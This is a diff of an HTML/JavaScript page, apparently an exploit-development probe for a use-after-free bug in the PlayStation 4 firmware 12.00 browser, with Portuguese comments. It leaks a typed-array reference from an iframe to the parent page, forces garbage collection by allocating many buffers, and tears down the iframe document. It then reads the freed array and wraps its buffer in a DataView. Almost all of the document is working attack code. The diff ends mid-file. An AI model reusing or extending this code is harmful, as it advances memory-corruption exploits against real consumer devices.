@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Iframe UAF Probe</title>
+<title>PS4 Iframe UAF Probe - Corrected</title>
 </head>
 <body>
 
-<h2>PS4 12.00 - Iframe Post-Teardown Test</h2>
+<h2>PS4 12.00 - Iframe UAF Probe (Real Reference)</h2>
 
 <button onclick="startTest()">Start Test</button>
 
@@ -17,107 +17,85 @@ function log(msg) {
     document.getElementById("log").textContent += msg + "\n";
 }
 
-let leakedControllers = null;
-let leakedArray = null;
+// referência global no parent (ESSENCIAL)
+window.leakedArray = null;
 
 function startTest() {
-    log("[*] Creating iframe...");
+    log("[*] Criando iframe...");
 
     const iframe = document.createElement("iframe");
     iframe.style.width = "400px";
     iframe.style.height = "200px";
     document.body.appendChild(iframe);
 
-    const fWin = iframe.contentWindow;
-    const fDoc = fWin.document;
+    const fDoc = iframe.contentDocument || iframe.contentWindow.document;
 
     fDoc.open();
     fDoc.write(`
         <html>
         <body>
         <button onclick="run()">Run Inside Frame</button>
+
         <script>
-            const PATTERN = 2.121995791e-314;
-            let controllers = [];
+        let arr = new Float64Array(8);
+        arr[0] = 13.37;
 
-            for (let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(8);
-                arr[0] = i;
-                controllers.push(arr);
-            }
+        window.run = function() {
 
-            window.run = function() {
-                document.documentElement.webkitRequestFullscreen?.();
+            // 🔥 PASSO CRÍTICO: LEAK REAL (sem cópia)
+            parent.leakedArray = arr;
 
-                window.onblur = function() {
+            // fullscreen (mesma cadeia do bug)
+            document.documentElement.webkitRequestFullscreen?.();
 
-                    // 🔥 GC AGRESSIVO (o que deu mais crash)
-                    controllers = null;
-                    for (let i = 0; i < 20000; i++) {
-                        new ArrayBuffer(0x10000);
-                    }
+            window.onblur = function() {
 
-                    // expor tentativa de leak (se ainda existir)
-                    try {
-                        parent.postMessage({
-                            type: "LEAK",
-                            controllers: controllers
-                        }, "*");
-                    } catch(e) {}
+                // 🔥 PRESSÃO DE GC (como seu teste de maior crash rate)
+                arr = null;
 
-                    // teardown crítico
-                    setTimeout(() => {
-                        document.open();
-                        document.write("<h1>Teardown</h1>");
-                        document.close();
-                    }, 1000);
-                };
+                for (let i = 0; i < 20000; i++) {
+                    new ArrayBuffer(0x10000);
+                }
+
+                // 🔥 TEARDOWN CRÍTICO
+                setTimeout(() => {
+                    document.open();
+                    document.write("<h1>Teardown</h1>");
+                    document.close();
+                }, 1000);
             };
+        };
         <\/script>
+
         </body>
         </html>
     `);
     fDoc.close();
 
     // =========================
-    // RECEBER REFERÊNCIA (se possível)
-    // =========================
-    window.addEventListener("message", (e) => {
-        if (e.data && e.data.type === "LEAK") {
-            leakedControllers = e.data.controllers;
-
-            try {
-                leakedArray = leakedControllers ? leakedControllers[0] : null;
-                log("[+] Leak recebido");
-            } catch (err) {
-                log("[!] Erro ao salvar leak: " + err);
-            }
-        }
-    });
-
-    // =========================
-    // TESTES PÓS-TEARDOWN
+    // TESTES PÓS-TEARDOWN (NO PARENT)
     // =========================
     setTimeout(() => {
-        log("[*] Running post-teardown tests...");
+
+        log("[*] Testando acesso pós-teardown...");
 
         try {
-            log("[TEST A] Array access:");
-            log(leakedArray ? leakedArray[0] : "null");
+            log("[TEST A] Valor:");
+            log(window.leakedArray ? window.leakedArray[0] : "null");
         } catch(e) {
             log("[TEST A ERROR] " + e);
         }
 
         try {
             log("[TEST B] Buffer:");
-            log(leakedArray ? leakedArray.buffer.byteLength : "null");
+            log(window.leakedArray ? window.leakedArray.buffer.byteLength : "null");
         } catch(e) {
             log("[TEST B ERROR] " + e);
         }
 
         try {
             log("[TEST C] DataView:");
-            let dv = new DataView(leakedArray.buffer);
+            let dv = new DataView(window.leakedArray.buffer);
             log(dv.getUint32(0, true));
         } catch(e) {
             log("[TEST C ERROR] " + e);
